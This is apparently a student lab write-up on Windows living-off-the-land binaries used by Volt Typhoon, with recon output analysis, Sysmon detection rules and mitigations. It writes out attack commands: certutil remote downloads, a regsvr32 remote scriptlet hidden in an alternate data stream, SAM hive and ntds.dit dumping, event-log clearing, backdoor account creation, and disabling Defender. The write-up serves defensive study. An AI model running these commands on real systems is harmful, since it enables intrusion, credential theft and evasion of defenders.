# Living Off the Land Binaries (LOLBins) - Execution and Documentation
Learning Objectives:

- Identify Living Off the Land Binaries from real-world threat intelligence advisories
- Execute common LOLBins on a Windows system and capture their output
- Interpret LOLBin output and explain what each data field reveals to an attacker
- Map LOLBin abuse techniques to the MITRE ATT&CK framework
- Detect LOLBin abuse through Windows event logs and command-line monitoring
- Document LOLBin capabilities in a structured threat intelligence format

### Advisory Sources
https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/prc-state-sponsored-actors-compromise-and-maintain-persistent-access-us-critical-infrastructure

https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF

MITRE ATT&CK Reference:

T1218 - System Binary Proxy Execution https://attack.mitre.org/techniques/T1218/

T1059 - Command and Scripting Interpreter https://attack.mitre.org/techniques/T1059/

T1105 - Ingress Tool Transfer https://attack.mitre.org/techniques/T1105/

### Documenting an LOLBin
The format used in this write-up will be as follows:

Command:

Screenshot:

What the Output Reveals to an Attacker:

MITRE ATT&CK Technique:

## Task 1: LOLBin Identification and Documentation
In this task we will open both advisories (ACSC and NSA/CISA), then scan for every Windows binary mentioned as abused by threat actors.

For each binary the following will be recorded:
- Binary name and full path (e.g., C:\Windows\System32\certutil.exe)
- Its legitimate, intended function
- How threat actors abuse it
- The applicable MITRE ATT&CK technique and sub-technique ID

| Binary                                                                                | Legitimate Use                                                                                    | Abuse Method                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | MITRE ATT&CK ID                                            | Advisory Reference                                                                                                                                                                                                                                                       |   |
|---------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|---|
| /wmic.exe<br>C:\Windows\System32\wbem\wmic.exe	<br>C:\Windows\SysWOW64\wbem\wmic.exe   | Used to interact with Windows Management Instrumentation for remote and local administration.     | Execute script from remote system<br><br>wmic.exe process get brief /format:"\\servername\C$\Windows\Temp\file.xsl"<br><br>Execute binary from remote system<br><br>wmic.exe /node:"192.168.0.1" process call create "cmd /c c:\windows\system32\calc.exe"<br><br>Execute binary from wmic to evade defensive counter measures<br><br>wmic.exe process call create "cmd /c c:\windows\system32\calc.exe"                                                                                                                                   | T1218<br>T1518.001<br>T1105<br>T1564.004                   | https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/prc-state-sponsored-actors-compromise-and-maintain-persistent-access-us-critical-infrastructure<br><br>https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF     |   |
| /cmd.exe<br>C:\Windows\SysWOW64\cmd.exe<br>C:\Windows\System32\cmd.exe                | Window's command line interpreter.                                                                | ADS<br><br>cmd.exe - < file.ext:payload.bat<br><br>cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:<br>https://www.example.org/file.sct ^scrobj.dll > file.ext:payload.bat<br><br><br>Download<br><br>type \\servername\C$\Windows\Temp\file.ext > C:\Windows\Temp\file.ext<br><br>Upload<br><br>type C:\Windows\Temp\file.ext > \\servername\C$\Windows\Temp\file.ext                                                                                                                                                                            | T1105<br>T1059.003<br>T1564.004<br>T1048.003               | https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/prc-state-sponsored-actors-compromise-and-maintain-persistent-access-us-critical-infrastructure<br><br><br>https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF |   |
| /ntdsutil.exe<br>C:\Windows\System32\ntdsutil.exe                                     | Exporting Active Directory Database                                                               | Dump the ntds.dit into a folder (This file has all AD data)<br><br>ntdsutil.exe "ac i ntds" "ifm" "create full c:\" q q                                                                                                                                                                                                                                                                                                                                                                                                                    | T1003.003                                                  | https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/prc-state-sponsored-actors-compromise-and-maintain-persistent-access-us-critical-infrastructure<br><br><br>https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF |   |
| /netsh.exe<br>C:\WINDOWS\System32\Netsh.exe<br>C:\WINDOWS\SysWOW64\Netsh.exe          | Used to view, config, manage, and troubleshoot local/remote network settings.                     | Execute a .dll file and gain persistence every time the netsh command is called<br><br>netsh.exe add helper C:\Windows\Temp\file.dll                                                                                                                                                                                                                                                                                                                                                                                                       | T1546.007                                                  | https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/prc-state-sponsored-actors-compromise-and-maintain-persistent-access-us-critical-infrastructure<br><br><br>https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF |   |
| /ldifde.exe<br>c:\windows\system32\ldifde.exe	<br>c:\windows\syswow64\ldifde.exe       | Manages LDAP directory objects.                                                                   | Download a .ldf file into LDAP<br><br>Ldifde -i -f file.ldf                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | T1105                                                      | https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/prc-state-sponsored-actors-compromise-and-maintain-persistent-access-us-critical-infrastructure<br><br><br>https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF |   |
| /reg.exe<br>C:\Windows\System32\reg.exe			<br>C:\Windows\SysWOW64\reg.exe                | Manipulates the registry.                                                                         | ADS<br><br>reg export HKLM\SOFTWARE\Microsoft\Evilreg C:\Windows\Temp\file.ext:evilreg.reg<br><br><br>Credentials (below command dumps hives, gets password hashes, other material)<br><br>reg save HKLM\SECURITY C:\Windows\Temp\file.1.bak && reg save HKLM\SYSTEM <br>C:\Windows\Temp\file.2.bak && reg save HKLM\SAM C:\Windows\Temp\file.3.bak                                                                                                                                                                                        | T1564.004<br>T1003.002                                     | https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/prc-state-sponsored-actors-compromise-and-maintain-persistent-access-us-critical-infrastructure<br><br><br>https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF |   |
| /certutil.exe<br>C:\Windows\System32\certutil.exe	<br>C:\Windows\SysWOW64\certutil.exe | Used for handling certificates.                                                                   | Many ways to abuse this, some include:<br><br>Download and save an executable to disk in the current folder.<br>		<br>certutil.exe -urlcache -f <br>https://www.example.org/file.exe<br> <br>file.exe<br><br>Download and save a .ps1 file to ADS<br><br>certutil.exe -urlcache -f <br>https://www.example.org/file.ps1<br> <br>C:\Windows\Temp\file.ext:ttt<br><br>Encode file with base64<br><br>certutil -encode <br>file.ext<br> <br>file.base64<br><br>Decode file with base64<br><br>certutil -decode <br>file.base64<br> <br>file.ext | T1564.004<br>T1105<br>T1027.013<br>T1140                   | https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/prc-state-sponsored-actors-compromise-and-maintain-persistent-access-us-critical-infrastructure<br><br><br>https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF |   |
| /dnscmd.exe<br>C:\Windows\System32\Dnscmd.exe	<br>C:\Windows\SysWOW64\Dnscmd.exe       | Command line tool for managing DNS.                                                               | Add custom crafted DLL as DNS service plug-in.<br><br>dnscmd.exe dc1.lab.int /config /serverlevelplugindll <br>\\servername\C$\Windows\Temp\file.dll                                                                                                                                                                                                                                                                                                                                                                                       | T1543.003                                                  | https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/prc-state-sponsored-actors-compromise-and-maintain-persistent-access-us-critical-infrastructure<br><br><br>https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF |   |
| /wevutil.exe<br>C:\Windows\System32\wevtutil.exe<br>C:\Windows\SysWOW64\wevtutil.exe  | Used to manage event logs.                                                                        | Pull specific event log (command from csa pdf)<br><br>wevtutil qe security /rd:true /f:text<br>/q:*[System[(EventID=4624) and<br>TimeCreated[@SystemTime>='{REDACTED}']] and<br>EventData[Data='{REDACTED}']]<br><br>Disable an Event log<br><br>wevtutil sl <logname> /e:false<br><br>Clear an event log<br><br>wevutil cl system<br>wevutil cl security                                                                                                                                                                                  | T1005<br>T1685.001<br>T1685.005                            |                                                                                                                                                                                                                                                                          |   |
| /makecab.exe<br>C:\Windows\System32\makecab.exe		<br>C:\Windows\SysWOW64\makecab.exe    | Compression tool used to perform data compression. Turns files into cabinet archives. (.cab)      | ADS<br>Compress the target file into a CAB file stored in the ADS of the target file.<br><br><br>makecab <br>C:\Windows\Temp\file.exe<br> <br>C:\Windows\Temp\file.ext:autoruns.cab<br><br>Download and compresses the target file and stores it in the target file.<br><br>makecab <br>\\servername\C$\Windows\Temp\file.exe<br> <br>C:\Windows\Temp\file.cab<br><br>Execute commands defined in Diamond Definition File (.ddf)<br><br>makecab /F <br>file.ddf                                                                            | T1564.004<br>T1105<br>T1036                                | https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/prc-state-sponsored-actors-compromise-and-maintain-persistent-access-us-critical-infrastructure<br><br><br>https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF |   |
| /whoami.exe<br>C:\Windows\System32\whoami.exe<br>C:\Windows\SysWOW64\whoami.exe       | Displays the current user name, domain, security identifiers (SIDs), groups, and user privileges. | Discover all of the current user's permissions<br><br>whoami /all                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | T1033                                                      | https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/prc-state-sponsored-actors-compromise-and-maintain-persistent-access-us-critical-infrastructure<br><br><br>https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF |   |
| /net.exe<br>C:\Windows\System32\net.exe                                               | Used for local and network management.                                                            | Discovery<br><br>net user /domain<br><br>net localgroup administrators<br><br>net use<br><br>net view /domain<br><br>Persistence<br><br>net create account eviluser password123 /add<br><br>Defense Evasion<br><br>net stop "process"<br><br>net stop "process" /y<br><br>Lateral Movement (command below just uses example format)<br><br>net use Z:\\Targetserver\c$                                                                                                                                                                     | T1562.001<br>T1021.002<br>T1078<br>T1136<br>T1049<br>T1087 | https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/prc-state-sponsored-actors-compromise-and-maintain-persistent-access-us-critical-infrastructure<br><br><br>https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF |   |

Footnotes: ADS means Alternate Data Streams. Advisory references reference both sources as they both have the same binaries.

#### Questions:
Which LOLBin appears in both advisories?
- All of these binaries appear in both advisories

Why do state-sponsored actors prefer LOLBins over custom malware?
- Easier to evade defenses like AV/EDRs
- Minimal forensic evidence
- Easier to blend in with typical activity
- They don't have to spend time developing their own tools

What is the "living off the land" naming convention based on?
- It comes from the concept of using resources that you already have access to

## Task 2: Discovery and Reconnaissance LOLBin Execution
From the threat reports, select 8 LOLBins that are used for discovery and reconnaissance. For each LOLBin document it as designated in the section "Documenting an LOLBin" section.

1. systeminfo

Command: ```systeminfo```

Screenshot:

<img width="654" height="693" alt="image" src="https://github.com/user-attachments/assets/47d393d3-3648-46de-b7a8-eb2797dc6ef3" />

What the Output Reveals to an Attacker:

This output shows us numerous things about the host which is why I chose to run this first in our enumeration. As the attacker, from the output, we can tell that:
- This OS is Windows 10 Home, important to know when searching for CVEs
- The hotfix list allows us to search for vulns that may yet to be patched by these hotfixes
- The domain field tells us that this pc is not domain-joined
- The system manufacturer and model both tell us that this pc is a vm. So in this case we most likely would pivot to a different device, as it might be a honeypot.
- The timezone can help the attacker learn when to run commands to blend in with normal activity
- We can see the registered owner of the device which may lead to credential attacks

MITRE ATT&CK Technique: T1082 — System Information Discovery

2. whoami

Command: ```whoami /all```

Screenshot:

<img width="844" height="558" alt="image" src="https://github.com/user-attachments/assets/829412c2-1045-473f-a153-bba5cec4ad7c" />

What the Output Reveals to an Attacker:

The output for this command is telling the attacker exactly what the current user (user command was run from) can do on the system. The username and SID (Security Identifier) are helpful to know, and the SID also reinforces what systeminfo said in that this pc is not domain-joined. The group info lets the attacker know which groups the current user is in, here we see that our user is only in the defualt groups. Note that we do not have the BUILTIN/Administrators group membership so we would have to escalate privileges on this user to gain admin access. In the privileges info we can also see that we have all of the interesting privileges disabled. 

MITRE ATT&CK Technique: T1033 - System Owner/User Discovery 

3. net user

Command: ```net user```

Screenshot:

<img width="579" height="228" alt="image" src="https://github.com/user-attachments/assets/a2c1ee69-aacc-4d4a-a5c8-74a8e6d9c83b" />

What the Output Reveals to an Attacker:

This command reveals all of the local accounts on the host. In this instance we can see two human accounts that aren't default, azrael and Apollo. Something to note is that both Guest and Administrator are still at defaults, meaning an attacker could look to exploit misconfigurations present.

MITRE ATT&CK Technique: T1087.001 - Account Discovery: Local Account 

4. tasklist

Command: ```tasklist``` ```tasklist /v```

Screenshot:

<img width="831" height="594" alt="image" src="https://github.com/user-attachments/assets/73ad17ad-ae5a-44c6-86d8-d021d7bb0906" />
<img width="891" height="698" alt="image" src="https://github.com/user-attachments/assets/a9a11d52-a1ed-4a31-b173-45605523cbfd" />
<img width="848" height="697" alt="image" src="https://github.com/user-attachments/assets/82de6591-4a80-4ed0-adb7-3c4acef44c51" />

<img width="586" height="606" alt="image" src="https://github.com/user-attachments/assets/4b492a7c-bfbf-4470-926f-b22f0d5ab735" />
<img width="566" height="707" alt="image" src="https://github.com/user-attachments/assets/81b32a1d-02aa-4e81-be75-b665433a25c4" />
<img width="565" height="656" alt="image" src="https://github.com/user-attachments/assets/755fb689-c444-4170-9c88-8d798cce81c0" />

What the Output Reveals to an Attacker:

First we used two different commands, /v just means verbose, so there will be more info. The non-verbose was mainly used here for more readable screenshots. Also since this is a default Windows 10 install with no additional downloads then there is very little in the way of interesting tasks for now. With that said, with the output we received an attacker will still notice several notable tasks. First, the User Name column will reveal which user is runnning the process. From this output the attacker can see that Apollo is currently on and running tasks, again useful for timing activity with legitimate activity. MsMpEng.exe, along with MpDefenderCoreService.exe, SecurityHealthService.exe, and NisSrv.exe shows the attacker that Microsoft Defender is currently up and running. Next, a process that is extremely interesting is lsass.exe. An attacker can use this to dump credentials. Lastly, WmiPrvSE.exe tells and attacker that wmi is also up and running which is another LOLBin with excellent recon potential. 

MITRE ATT&CK Technique: T1057 — Process Discovery

5. wmic

Command: ```wmic qfe list``` ```wmic volume list brief``` ```wmic path win32_logicaldisk get caption,filesystem,freespace,size,volumename```

Screenshot:

<img width="1010" height="306" alt="image" src="https://github.com/user-attachments/assets/9ff552d5-1e54-4bd3-89af-b344688a8d29" />

<img width="790" height="113" alt="image" src="https://github.com/user-attachments/assets/1d40baef-21e7-4d0c-8ab7-01d259a6f9ef" />

<img width="696" height="92" alt="image" src="https://github.com/user-attachments/assets/99394518-1050-4615-b7b8-d0111642b868" />

What the Output Reveals to an Attacker:

This output ties back into what we saw with the systeminfo command. Here we can see all hotfixes applied which the attacker can then use to determine which CVEs can be used against this system. The two commands relating to volumes and storage can give the attacker valuable info about potentially hidden partitions on the disks. Other wmic commands can also return what programs are install on the host, but this box won't have any since it's default install. Side Note: wmic is extremely versatile and was actually discontinued by Microsoft in Windows 11 due to how helpful it is to attackers.

MITRE ATT&CK Technique: T1047 — Windows Management Instrumentation, T1082 — System Information Discovery

6. net

Command: ```net localgroup``` ```net localgroup administrators```

Screenshot:

<img width="738" height="472" alt="image" src="https://github.com/user-attachments/assets/7054ae1c-2fd8-4c6c-a3b9-5c22271f98c2" />

What the Output Reveals to an Attacker:

The net localgroup adminstrators tells the attacker all of the administrator accounts on the system. When looking to escalate privileges this info is critical to know. The follow up command tells me all of the groups on the system. This gives the attacker other potential pivot/escalation routes. For example, the Remote Management Users may be interesting to investigate as we could gain WinRM access. Based on previous LOLBins and their outputs we can see that the azrael account is the account that we want to target for privilege escalation.

MITRE ATT&CK Technique: T1069.001 — Permission Groups Discovery: Local Groups

7. reg

Command: ```reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"``` ```reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"```

Screenshot:

<img width="627" height="157" alt="image" src="https://github.com/user-attachments/assets/33faee87-8313-44fc-85af-c9d49cbf5847" />

What the Output Reveals to an Attacker:

These commands will reveal what programs launch at startup automatically. They can offer valuable information, though in this instance there's not much. One thing that this output would tell an attacker is that hiding a program in these locations would immediately stick out to any defenders. OneDrive may be worth looking into as well.

MITRE ATT&CK Technique: T1012 — Query Registry, T1547.001 — Boot or Logon Autostart Execution: Registry Run Keys

8. ipconfig

Command: ```ipconfig /all```

Screenshot:

<img width="617" height="445" alt="image" src="https://github.com/user-attachments/assets/a6c5d230-8263-469d-9614-7ead3a335a7e" />

What the Output Reveals to an Attacker:

Using this command the attacker can put together a pretty good picture of what the network surrounding the host looks like. Just by viewing the ip range they can deduce that this is a SOHO, much like the kind that Volt Typhoon uses to obfuscate their actions. Using the IPs the attackers can now have a good idea of what ranges to target with additional network scanning. The physical address field can also yield valuable info on the system to find potential exploits, though in this case it just reinforces that this is a VMware Network Adapter.

MITRE ATT&CK Technique: T1016 — System Network Configuration Discovery

#### Quick Note for this section: There are more interesting LOLBins I would have run rather than ones that gave a lot of repeat info. (i.e systeminfo and wmic qfe list in regard to patches.) However, since this pc isn't domain-joined, anything that relates to domain enumeration will throw errors.

#### Questions: 

Which binary revealed the most useful information for lateral movement?
- The net localgroup administrators gave the most useful info. We know that azrael is the only human admin account on this system that can be targeted for privilege escalation. Some other binaries also pointed to this info but this one confirms that the user is in the administrators group.

Which binary's output would be most suspicious to a defender? 
- The reg query commands would most likely be the most suspicious at first glance to a defender. In conjunction with the other discovery binaries run it would become pretty obvious that this is an attacker looking for persistence.

Why might a threat actor use wmic.exe instead of PowerShell for system queries?
- It's less recognizable by SIEMs and EDRs
- It's way less likely to leave a log of what commands are being run

## Task 3: Execution, Download, and Defense Evasion LOLBin Execution

From the threat reports, select 6 LOLBins that are used for execution, download, or defense evasion.The advisories reference binaries used to download remote files, execute scripts without writing to disk, run code through legitimate system utilities, and bypass application allowlisting.

Document Format:
- Exact command ran
- Screenshot of output
- Why this technique evades detection
- MITRE ATT&CK ID.

Make a temp directory to work with for this section: mkdir C\:temp

1. certutil.exe

Commands:

Create our temporary directory ```mkdir C:\temp```

Exploit certutil.exe. ```certutil.exe -urlcache -split -f https://genji.pk/ C:\temp\test.txt``` This cmd downloads this website's page and puts it into test.txt in temp dir.

Read the file ```type C:\temp\test.txt```

Delete the file ```del C:\temp\test.txt```

Screenshot:

<img width="627" height="78" alt="image" src="https://github.com/user-attachments/assets/89050d88-0d24-441d-b90e-19a8868c9d5a" />

<img width="425" height="193" alt="image" src="https://github.com/user-attachments/assets/dd0f1e46-9d37-4bbc-9f64-87a184a4291f" />

<img width="1013" height="709" alt="image" src="https://github.com/user-attachments/assets/7a71aefe-bf16-463f-9c3d-446cd4434ad2" />

How/Why it Evades Detection:

Certutil is supposed to be used for certificate management and depending on an organization's rules/policies, it may even have file paths that allows it to download files unrestricted. Note that this command does trigger Microsoft Defender's real-time protection rules, at least with the website that I tried to download. To bypass I had to disable tamper protection and turn off real-time protection. As mentioned prior, if a folder happens to be excluded from this on an organization's system, the attacker could leverage this without having to bypass it themselves.

MITRE ATT&CK Technique: T1105 — Ingress Tool Transfer

2. makecab.exe

Command:
```
echo Test file makecab demo > C:\temp\demo.txt
makecab C:\temp\demo.txt C:\temp\demo.cab
```
Screenshot:

<img width="496" height="521" alt="image" src="https://github.com/user-attachments/assets/49593e32-8f21-47ee-a62c-03ddc9260f59" />

How/Why it Evades Detection:

This technique offers numerous advantages for an attacker. It enables evasions by hiding data, allows file compression into a cab file (a file type often overlooked by all detection softwares/defenders), and its execution in general is very rarely monitored for unlike many of the other LOLBins.

MITRE ATT&CK Technique: T1560.001 — Archive Collected Data: Archive via Utility

3. wmic.exe

Command:
```wmic process call create "notepad.exe"```

Screenshot:

<img width="995" height="676" alt="image" src="https://github.com/user-attachments/assets/8d19b6d3-8dad-4bb8-acb8-8313726c01c6" />

How/Why it Evades Detection:

The advantage to using wmic.exe to launch a program is that the parent process becomes wmic's legitimate process, WmiPrvSE.exe. In addition, logging for this command isn't enabled by default, which is another advantage.

MITRE ATT&CK Technique: T1047 — Windows Management Instrumentation

4. ntdsutil.exe

Command:
```ntdsutil``` command I ran, this would open up a ntdsutil instance if I had AD installed.
```wmic process call create "ntdsutil \"ac i ntds\" ifm \"create full C:\Windows\Temp\tmp\""``` (ac i ntds is short for activate instance ntds)

Screenshot:

<img width="995" height="159" alt="image" src="https://github.com/user-attachments/assets/448db4b6-cdc5-496d-9f79-731a3fa4ed9d" />

How/Why it Evades Detection:

The one-liner above creates an ntdsutil process and then dumps the host's entire ntds.dit into a folder, which can then be reconstructed by the attacker later. In our case we see an error because I don't have a Windows server os with AD installed.

MITRE ATT&CK Technique: T1003.003 — OS Credential Dumping: NTDS

5. powershell.exe

Command:
```
mkdir C:\temp
Set-Content -Path C:\temp\demo.bat -Value "@echo off" -Encoding ASCII
Add-Content -Path C:\temp\demo.bat -Value "echo hidden window test > C:\temp\hidden.txt" -Encoding ASCII
Start-Process -FilePath "C:\temp\demo.bat" -WindowStyle Hidden -Wait #Note: I used wait to let the process start to avoid potential errors.
type C:\temp\hidden.txt
```
Screenshot:

<img width="794" height="75" alt="image" src="https://github.com/user-attachments/assets/6dffe08a-683e-471a-bf64-869ab02ffa74" />

<img width="578" height="173" alt="image" src="https://github.com/user-attachments/assets/8db4ec31-2055-4c67-b196-389ba80236ca" />

<img width="262" height="56" alt="image" src="https://github.com/user-attachments/assets/fe73b4db-d868-4db1-b95c-bd5b32b54c15" />

How/Why it Evades Detection:

This LOLBin offers an excellent way for an attacker to actively run commands or scripts on an active system without being noticed by users. This specific example is hiding anything that might warn a user, such as terminal windows, pop-ups, etc. In addition, an organization needs to have a specific windows event log (Event ID 4688) enabled in order to see logs left by this exploit.

MITRE ATT&CK Technique: T1564.003 — Hide Artifacts: Hidden Window

6. netsh.exe

Command: 
```
netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=8888 connectaddress=127.0.0.1 connectport=80
netsh interface portproxy show all
```

Screenshot:

<img width="843" height="182" alt="image" src="https://github.com/user-attachments/assets/dd775a77-2f64-4f64-96e6-cbfc637be2d7" />

How/Why it Evades Detection:

While this LOLBin requires admin access, it's incredibly powerful. In this example I create a proxy on the host which redirects all traffic heading for 127.0.0.1:8888 to 127.0.0.1:80 instead. Comparing this to other proxies, it leaves a much smaller footprint in comparison to a third-party tool. The advisories explicity mentioned keeping an eye out for registry keys with this path as they aren't likely to be seen in a typical sys admin environment.

MITRE ATT&CK Technique: T1090 — Proxy, T1090.001 — Proxy: Internal Proxy

#### Questions: 

Which LOLBin can download files without triggering typical firewall alerts?

Certutil.exe can download files while bypassing typical firewall alerts. With how known it has become, EDRs are flagging certutil -urlcache. However, if this isnt blocked by the organization than it can still be allowed.

How can regsvr32.exe execute code without writing files to disk?

Attackers can use URLs to load the scripts into the command line. Since it uses the URL as an argument, you can simply pass the script in like this.

Why is msbuild.exe dangerous in environments with .NET installed?

Because it essentially lets attackers compile and execute code on the system without triggering defenses due to it working entirely in memory.

## Task 4: LOLBin Detection and Threat Report
Build detection capabilities for LOLBin abuse and write a threat intelligence report based on your findings.

### Part A: Detection

Download and install Sysmon. Use the Sysmon XML configuration file from SwiftOnSecurity as a default configuration for what to log.
```
mkdir C:\temp\sysmon
cd C:\temp\sysmon

# Download Sysmon
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "Sysmon.zip"
Expand-Archive -Path "Sysmon.zip" -DestinationPath "."

# Download SwiftOnSecurity's config
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" -OutFile "sysmonconfig.xml"

# Install Sysmon with the config
.\Sysmon64.exe -accepteula -i sysmonconfig.xml
```

Execute at least 5 of your LOLBins and show their execution in the Sysmon logs.

I ran the following LOLBins:

- certutil.exe
- wmic.exe ```wmic process call create```
- makecab.exe
- net.exe/net1.exe ```net localgroup administrators```
- reg.exe ```reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"``` ```reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"```

Execution in the order of the commands run above:

- certutil.exe

<img width="967" height="442" alt="image" src="https://github.com/user-attachments/assets/6d234cb6-759e-40a3-8ab7-ffbd163de8b9" />

- wmic.exe

<img width="964" height="423" alt="image" src="https://github.com/user-attachments/assets/8ea4c24f-9708-4cc8-b1bf-4e2c96a73659" />
<img width="965" height="426" alt="image" src="https://github.com/user-attachments/assets/cde55402-e825-40e9-bb9c-48559f09fd98" />

- makecab.exe

<img width="981" height="420" alt="image" src="https://github.com/user-attachments/assets/692d2be2-a7a4-4cb9-a2fd-0f7a5f584ada" />

- net.exe

<img width="966" height="425" alt="image" src="https://github.com/user-attachments/assets/0aeae98d-e613-4d46-a86a-532c7a9cce45" />
<img width="965" height="423" alt="image" src="https://github.com/user-attachments/assets/70cdf2b3-286e-4dba-8486-7ce7354da048" />

- reg.exe

<img width="970" height="419" alt="image" src="https://github.com/user-attachments/assets/dc416587-f6c8-4212-b01a-b7113e485002" />
<img width="967" height="432" alt="image" src="https://github.com/user-attachments/assets/48085721-38b7-4da4-9ae5-9a757f2e2b32" />


### Part B: Threat Report

### 1. Executive Summary

Living off the Land Binaries (LOLBins) are legitimate, digitally signed operating system utilities that threat actors use to perform malicious actions. They offer the advantage of not having to create and transfer custom tools/malware to a target system. Because these binaries are generally trusted by design and  used in day-to-day operations by legitimate administrators, their execution can fail to trigger signature-based AV/EDR detection or whitelisting policies on its own.

Many threat actors use LOLBins, however, the People's Republic of China state-sponsored actor called Volt Typhoon is one of the more well-known examples. As seen in advisories from CISA, NSA, FBI, and international partners, Volt Typhoon has been able to maintain undetected access to U.S. critical infrastructure networks. At times going for as long as five years without being discovered. They rely almost entirely on LOLBins and valid stolen credentials rather than custom malware. This report documents the binaries referenced in those advisories, demonstrates their execution and forensic footprint in a controlled lab environment, and provides detection and mitigation guidance based on the advisories' own recommendations.

### 2. LOLBin Documentation

See [Task 1: LOLBin Identification and Documentation](#task-1-lolbin-identification-and-documentation) for the full reference table of binaries, their legitimate use, abuse methods, and MITRE ATT&CK mappings.

### 3. Execution Evidence

See [Task 2: Discovery and Reconnaissance LOLBin Execution](#task-2-discovery-and-reconnaissance-lolbin-execution) and [Task 3: Execution, Download, and Defense Evasion LOLBin Execution](#task-3-execution-download-and-defense-evasion-lolbin-execution) for full command documentation, screenshots, and analysis of what each binary reveals to an attacker or how it evades detection. [Part A: Detection](#part-a-detection) above provides evidence for 5 LOLBins being run on the host system.

### 4. Detection Recommendations

| Log Source | Event ID | What It Captures |
|---|---|---|
| Windows Security Log | 4688 | Process creation — requires Group Policy setting "Include command line in process creation events" to be enabled as this is off by default |
| Windows Security Log | 4624 / 4625 | Successful/failed logons — useful for detecting password spraying or brute force attacks which typically come before LOLBin abuse |
| Windows Security Log | 1102 | Audit log cleared — a known Volt Typhoon anti-forensics tactic which should be investigated if it has been found |
| Sysmon | 1 | Process Create — captures full CommandLine, ParentImage, ParentCommandLine, and file hashes. It provides far more detail than native 4688 alone |
| Sysmon | 3 | Network Connection — useful for catching certutil/BITS-style download traffic coming from unexpected processes |
| Sysmon | 13 | Registry Value Set — critical for detecting the PortProxy registry key (`HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp\`) explicitly called out in both advisories |
| Windows Application Log (ESENT) | 216, 325, 326, 327 | NTDS.dit database location changes, creation, mounting, and detachment, all key indicators of ntdsutil/NTDS credential extraction |
| WMI-Activity/Trace | — | A setting disabled by default and should be enabled to capture the specific commands executed via WMIC/WMI, which otherwise leave minimal forensic trace |
| PowerShell Operational Log | 4104 | Script Block Logging — captures executed script content |

**Detection rules based on this lab's findings:**
- Alert on any process among {certutil.exe, wmic.exe, makecab.exe, net.exe, reg.exe, ntdsutil.exe} whose **ParentImage is powershell.exe or cmd.exe**, when many events happen from the same LogonId within a short time window.
- Alert on `wmic.exe process call create` where the resulting child process's ParentImage is `WmiPrvSE.exe` — a legitimate but easily-monitored indirection pattern.
- Alert on any populated registry value under `HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp\`, as both advisories say that legitimate use of port proxies is rare and is a staple of Volt Typhoon.
- Alert on `certutil.exe` command lines containing `-urlcache` as this would almost never used in harmless certificate management tasks.

### 5. Mitigation Recommendations

**Application Allowlisting (AppLocker / WDAC)**
- Rather than blocking LOLBins outright as many are needed for typical administrative tasks, implement restrictions on high-risk argument patterns: block `regsvr32.exe` when invoked with `/i:http`, block `certutil.exe -urlcache`, and restrict `wmic.exe /node:` (remote execution) to authorized administrative workstations only.
- Apply Microsoft's recommended WDAC baseline policies. This includes rules specifically targeting known LOLBin abuse patterns.

**Logging Configuration**
- Enable "Audit Process Creation" and "Include command line in process creation events" in Group Policy (`Computer Configuration > Administrative Templates > System > Audit Process Creation`) — both advisories stress this is off by default and is required to see the full command-line arguments in Event ID 4688.
- Deploy Sysmon with the SwiftOnSecurity or another maintained configuration across all endpoints.
- Enable WMI-Activity/Trace logging and PowerShell Script Block Logging (Event ID 4104) across the organization.
- Forward all logs to a centralized, hardened SIEM/logging server on a segmented network as recommended in both advisories. Volt Typhoon selectively clears local logs (Event ID 1102) to cover their tracks. By using centralized forwarding, a copy will be retained regardless.

**Group Policy / Account Hardening**
- Enforce least privilege: this lab demonstrates that several of these LOLBins require privilege escalation to make the exploit possible. Perform regular audits and minimize Administrators group membership.
- Disable or rename default Administrator and Guest accounts if/when possible.
